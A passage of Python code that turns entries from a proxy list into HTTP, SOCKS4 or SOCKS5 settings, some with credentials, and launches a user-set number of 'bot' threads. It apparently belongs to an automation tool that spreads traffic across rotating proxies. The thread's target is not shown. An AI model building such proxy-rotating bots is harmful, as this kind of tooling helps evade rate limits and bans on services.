                proxygeti=(proxytotLen[proxysay])
                pveri=proxygeti.replace('\n','')
                pip = pveri.split(':')[0]
                pport = pveri.split(':')[1]
                if pro == '1':
                    pname = pveri.split(':')[2]
                    ppass = pveri.split(':')[3]
                    proxies = {
                        'http': 'socks5://' + pname + ':' + ppass + '@' + pip + ':' + pport,
                        'https': 'socks5://' + pname + ':' + ppass + '@' + pip + ':' + pport }
                if pro == '2':
                    proxies = {
                        'http': 'http://' + pip + ':' + pport,
                        'https': 'https://' + pip + ':' + pport }
                if pro == '3':
                    pname = pveri.split(':')[2]
                    ppass = pveri.split(':')[3]
                    proxies = {
                        'http': 'http://' + pname + ':' + ppass + '@' + pip + ':' + pport,
                        'https': 'https://' + pname + ':' + ppass + '@' + pip + ':' + pport }
                if pro == '4':
                    proxies = {
                        'http': 'socks4://' + pip + ':' + pport,
                        'https': 'socks4://' + pip + ':' + pport }
                if pro == '5':
                    pname = pveri.split(':')[2]
                    ppass = pveri.split(':')[3]
                    proxies = {
                        'http': 'socks4://' + pname + ':' + ppass + '@' + pip + ':' + pport,
                        'https': 'socks4://' + pname + ':' + ppass + '@' + pip + ':' + pport }
                if pro == '6':
                    proxies = {
                        'http': 'socks5://' + pip + ':' + pport,
                        'https': 'socks5://' + pip + ':' + pport }
                if pro == '7':
                    pname = pveri.split(':')[2]
                    ppass = pveri.split(':')[3]
                    proxies = {
                        'http': 'socks5://' + pname + ':' + ppass + '@' + pip + ':' + pport,
                        'https': 'socks5://' + pname + ':' + ppass + '@' + pip + ':' + pport }
                break
            except:pass
    else:
        proxies = ''
  

import threading
for xdeep in range(int(botgir)):
  XDeep = threading.Thread(target=XD)
  XDeep.start() 
